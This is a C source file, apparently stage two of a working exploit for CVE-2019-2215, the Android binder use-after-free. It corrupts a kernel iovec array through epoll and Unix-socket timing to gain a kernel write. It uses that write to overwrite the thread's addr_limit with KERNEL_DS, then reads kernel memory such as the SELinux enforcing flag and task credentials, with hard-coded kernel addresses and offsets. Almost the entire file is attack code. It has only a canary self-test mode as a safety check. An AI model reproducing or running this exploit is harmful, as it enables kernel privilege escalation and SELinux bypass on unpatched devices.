#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>

/* CVE-2019-2215 stage 2 -- the write primitive, sequenced on skb boundaries (S41).
 *
 * What broot2/broot3 settled:
 *   - recvmsg latches a segment's destination for the whole segment: the 112 bytes all
 *     went into the kernel's iovec array, nothing reached the segments the patch
 *     installed (broot2, canary untouched).
 *   - readv on a pipe returns as soon as it has copied anything, so the syscall cannot
 *     be sitting between two buffers when the mutation lands (broot3: readv -> 4096).
 *   - unix_stream_recvmsg with MSG_WAITALL DOES sit between skbs until the requested
 *     total has arrived, and pipe_read/recvmsg recompute the current segment from the
 *     array at every boundary -- which is exactly how the stage-1 leak got re-pointed
 *     at the slot.  So the mutation must land between skbs, and it can, deterministically:
 *
 *     parent: recvmsg(MSG_WAITALL)  <-- requested total only arrives at the very end
 *     child :  write(S1)            fills iovec[0..4], parent still waiting
 *              epoll_ctl(DEL)       remove_wait_queue -> __list_del writes H into
 *                                   iovec[5].iov_base/len  (thread->wait = +0x48 here)
 *              write(patch, 80)     destination = H = the array itself -> rewrites
 *                                   iovec[5..9]; iovec[5].iov_len becomes 0x30, which
 *                                   is LESS than the 80 bytes already written
 *              write(vals, 32)      recompute: offset 80 >= len 0x30 -> walk out of
 *                                   segment 5 into iovec[6] -> destination = OURS
 *     No close(): closing the writer makes the reader return early (that is what ended
 *     broot2 after 112 bytes).
 *
 * Modes:
 *   arith [tries]            iovec[6..9] = four user canaries => proves the chain with
 *                            zero kernel writes.  Must pass before anything else runs.
 *   clob <hex-ti> [tries]    iovec[6] = ti+0x08 with value KERNEL_DS => addr_limit
 *                            raised; iovec[7..9] stay user canaries so the extra 24
 *                            bytes land harmlessly.
 *   read <hex-ti> [tries]    clobber, then read the verification set through a pipe.
 */
#define PAGE            0x1000
#define IOVEC_ARRAY_SZ  25
#define WQ              (0x48 / 16)             /* 4 here (poc98 build: 10) */
#define S1              4096                    /* fills iovec[0..4] */
#define PATCH_BYTES     80
#define VAL_BYTES       32
#define BINDER_THREAD_EXIT 0x40046208u
#define BLK             0x11000
#define MARK(j)         (0x10 + (j))
#define KERNEL_DS_VAL   0xfffffffffffffffeUL

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define INIT_CRED         0xffffffc001636d80UL
#define TASK_CRED_OFF     0x4a8
#define TASK_REALCRED_OFF 0x658
#define TASK_PID_OFF      0x470
#define TI_ADDR_LIMIT     0x08
#define TI_TASK           0x10

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code, flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size, offsets_size;
    union { struct { binder_uintptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size, write_consumed, write_buffer;
    binder_size_t read_size, read_consumed, read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

struct iovec_patch {
    unsigned long seg5_base, seg5_len;   /* seg5_len = 0x30 < 80 forces the walk out */
    unsigned long seg6_base, seg6_len;
    unsigned long seg7_base, seg7_len;
    unsigned long seg8_base, seg8_len;
    unsigned long seg9_base, seg9_len;
};

static char *fill;
static unsigned long *canary;
static unsigned long *seg5_sink;

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16], rbuf[256];
    struct binder_transaction_data tr;
    struct binder_write_read bwr, bwr2;
    uint32_t cmd = BC_TRANSACTION;
    int rc, n;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm rc=%d errno=%d\n", rc, errno); return rc; }
    for (n = 0; n < 3; n++) {
        size_t off = 0;
        int complete = 0, reply = 0;
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206) complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { reply = 1; off += 64; }
        }
        printf("  drain %d: rc=%d rconsumed=%llu complete=%d reply=%d\n", n, rc,
               (unsigned long long)bwr2.read_consumed, complete, reply);
        if (rc) return rc;
        if (complete && !reply) return 0;
        if (reply) return -1;
    }
    return -1;
}

static int kread(unsigned long addr, int len, unsigned char *out)
{
    int pfd[2], rc, got = 0;
    unsigned char primer[8];
    struct iovec iov[2];

    if (pipe(pfd)) return -1;
    memset(primer, 0xA7, sizeof primer);
    iov[0].iov_base = primer;
    iov[0].iov_len = sizeof primer;
    iov[1].iov_base = (void *)(uintptr_t)addr;
    iov[1].iov_len = len;
    errno = 0;
    rc = (int)writev(pfd[1], iov, 2);
    if (rc < 0) { printf("  kread %016lx: writev errno=%d\n", addr, errno); close(pfd[0]); close(pfd[1]); return -1; }
    while (got < rc) {
        ssize_t n = read(pfd[0], out + got, rc - got);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; break; }
        got += (int)n;
    }
    close(pfd[0]); close(pfd[1]);
    if (got < (int)sizeof primer) return -1;
    memmove(out, out + sizeof primer, got - sizeof primer);
    return got - (int)sizeof primer;
}

static void dump_verify(unsigned long ti)
{
    unsigned char b[16];
    unsigned long task = 0, al = 0, cred = 0, rcred = 0;
    unsigned int v = 0xdeadbeef, p = 0;

    if (kread(ti + TI_ADDR_LIMIT, 8, b) == 8) memcpy(&al, b, 8);
    if (kread(ti + TI_TASK, 8, b) == 8) memcpy(&task, b, 8);
    printf("  ti %016lx: addr_limit=%016lx task=%016lx\n", ti, al, task);
    if (task < 0xffffff8000000000UL) { printf("  task implausible -> candidate wrong\n"); return; }
    if (kread(task + TASK_PID_OFF, 4, b) == 4) {
        memcpy(&p, b, 4);
        printf("  [task+0x%x] pid=%u ours=%d %s\n", TASK_PID_OFF, p, getpid(),
               p == (unsigned)getpid() ? "MATCH" : "no");
    }
    if (kread(task + TASK_CRED_OFF, 8, b) == 8) memcpy(&cred, b, 8);
    if (kread(task + TASK_REALCRED_OFF, 8, b) == 8) memcpy(&rcred, b, 8);
    printf("  cred=%016lx real_cred=%016lx init_cred=%016lx\n", cred, rcred, INIT_CRED);
    if (kread(SELINUX_ENFORCING, 4, b) == 4) {
        memcpy(&v, b, 4);
        printf("  selinux_enforcing=%u%s\n", v,
               v == 1 ? "   (readable and ==1: ARBITRARY KERNEL READ CONFIRMED)" : "");
    } else
        printf("  selinux_enforcing unreadable\n");
}

static int attempt(int arith, unsigned long dest, int *landed)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    struct iovec_patch ch;
    char *buf1, *patch, *vals, *tail;
    int socks[2], fd, epfd, rc = -1, j;
    pid_t pid;
    ssize_t r;
    void *map;
    unsigned long want;

    *landed = 0;
    epfd = epoll_create(1000);
    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); close(epfd); return -1; }
    map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); close(epfd); return -1; }

    buf1 = malloc(S1);
    patch = malloc(PATCH_BYTES);
    vals = malloc(VAL_BYTES);
    memset(buf1, 0x5A, S1);
    for (j = 0; j < 4; j++) {
        unsigned long a = arith ? 0x1111111111111111UL * (j + 1)
                               : (j == 0 ? KERNEL_DS_VAL : 0x3333333333333333UL * (j + 1));
        memcpy(vals + j * 8, &a, 8);
    }

    memset(iov, 0, sizeof iov);
    /* iovec[0..4] must sum to exactly S1 so that the iterator stands at iovec[5]
     * when the mutation lands.  iovec[4].iov_len is the wait spinlock: it is read by
     * spin_lock() during remove_wait_queue, so it must be 0 (unlocked, head==tail). */
    iov[0].iov_base = fill;                 iov[0].iov_len = S1 - 0x30;
    iov[1].iov_base = fill + BLK;           iov[1].iov_len = 0x10;
    iov[2].iov_base = fill + 2 * BLK;       iov[2].iov_len = 0x10;
    iov[3].iov_base = fill + 3 * BLK;       iov[3].iov_len = 0x10;
    iov[WQ].iov_base = fill + WQ * BLK;     iov[WQ].iov_len = 0;
    iov[5].iov_base = fill + 5 * BLK;       iov[5].iov_len = 0x1000;
    for (j = 6; j < IOVEC_ARRAY_SZ; j++) {
        iov[j].iov_base = fill + (size_t)j * BLK;
        iov[j].iov_len = 0x100;
    }
    want = 0;
    for (j = 0; j < IOVEC_ARRAY_SZ; j++) want += iov[j].iov_len;

    memset(&ch, 0, sizeof ch);
    ch.seg5_base = (unsigned long)(uintptr_t)seg5_sink;
    ch.seg5_len  = 0x30;
    if (arith) {
        ch.seg6_base = (unsigned long)(uintptr_t)canary;
        ch.seg7_base = (unsigned long)(uintptr_t)(canary + 1);
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 2);
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 3);
    } else {
        ch.seg6_base = dest;                                   /* thread_info + 0x08 */
        ch.seg7_base = (unsigned long)(uintptr_t)(canary + 1);
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 2);
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 3);
    }
    ch.seg6_len = ch.seg7_len = ch.seg8_len = ch.seg9_len = 8;
    memcpy(patch, &ch, sizeof ch);
    if (sizeof ch != PATCH_BYTES) printf("  !! patch %zu != %d\n", sizeof ch, PATCH_BYTES);

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) { perror("socketpair"); goto out; }
    if (arm_pending_tx(fd)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("ep_add"); goto out; }

    for (j = 0; j < 4; j++) canary[j] = 0xCCCCCCCCCCCCCCCCUL;
    seg5_sink[0] = 0xAAAAAAAAAAAAAAAAUL;

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(socks[0]);
        usleep(300000);
        if (write(socks[1], buf1, S1) != S1) perror("child buf1");
        usleep(150000);
        alarm(4);
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev)) perror("child ep_del");
        alarm(0);
        if (write(socks[1], patch, PATCH_BYTES) != PATCH_BYTES) perror("child patch");
        usleep(150000);
        if (write(socks[1], vals, VAL_BYTES) != VAL_BYTES) perror("child vals");
        /* keep the writer open so MSG_WAITALL does not get an early EOF, and top the
         * socket up to the length the iterator asked for so it finally returns */
        tail = malloc(want);
        memset(tail, 0x71, want);
        usleep(300000);
        if (write(socks[1], tail, want) != (ssize_t)want) printf("  child tail short\n");
        free(tail);
        usleep(300000);
        close(socks[1]);
        _exit(0);
    }
    close(socks[1]);

    alarm(40);
    errno = 0;
    {
        struct msghdr msg;
        memset(&msg, 0, sizeof msg);
        msg.msg_iov = iov;
        msg.msg_iovlen = IOVEC_ARRAY_SZ;
        r = recvmsg(socks[0], &msg, MSG_WAITALL);
        printf("  recvmsg -> %zd (entry want %lu) errno=%d flags=0x%x\n", r, want, errno,
               msg.msg_flags);
    }
    alarm(0);
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  child status=%d\n", st);
    }
    printf("  canary[0..3] = %016lx %016lx %016lx %016lx\n", canary[0], canary[1], canary[2], canary[3]);
    printf("  sent          = %016lx %016lx %016lx %016lx\n",
           *(unsigned long *)vals, *(unsigned long *)(vals + 8),
           *(unsigned long *)(vals + 16), *(unsigned long *)(vals + 24));
    printf("  seg5_sink[0]  = %016lx  (AAAA = the patch never reached iovec[5].iov_base)\n", seg5_sink[0]);
    if (canary[0] == *(unsigned long *)vals) {
        *landed = 1;
        printf("  ==> WRITE REDIRECTION PROVEN: iovec[6] was honoured across an skb boundary\n");
    } else if (seg5_sink[0] != 0xAAAAAAAAAAAAAAAAUL) {
        printf("  ==> the walk left segment 5 but landed elsewhere; arithmetic needs adjusting\n");
    }
    rc = 0;
out:
    if (rc) alarm(0);
    free(buf1); free(patch); free(vals);
    if (socks[0] >= 0) close(socks[0]);
    if (map != MAP_FAILED) munmap(map, 1 << 20);
    close(fd);
    close(epfd);
    return rc;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    int arith = !strcmp(mode, "arith");
    int tries = argc > 3 ? atoi(argv[3]) : 12;
    unsigned long ti = 0, dest = 0;
    int t, landed = 0;
    unsigned char b[8];

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    canary = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    seg5_sink = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!fill || canary == MAP_FAILED || seg5_sink == MAP_FAILED) { perror("alloc"); return 1; }
    for (t = 0; t < IOVEC_ARRAY_SZ; t++) memset(fill + (size_t)t * BLK, MARK(t), BLK);
    pin0();
    if (!arith) {
        if (argc < 3) { printf("need thread_info hex\n"); return 1; }
        ti = strtoul(argv[2], NULL, 16);
        dest = ti + TI_ADDR_LIMIT;
        printf("mode=%s ti=%016lx -> writing %016lx\n", mode, ti, dest);
    } else
        printf("mode=arith (every destination is our own memory)\n");

    for (t = 0; t < tries; t++) {
        printf("--- attempt %d ---\n", t);
        if (attempt(arith, dest, &landed)) continue;
        if (!landed) continue;
        if (arith) { printf("  safe mode passed: chain works, nothing written in kernel\n"); break; }
        if (kread(SELINUX_ENFORCING, 4, b) == 4) dump_verify(ti);
        else printf("  canary landed but kernel read still refused (E?\n");
        break;
    }
    return 0;
}
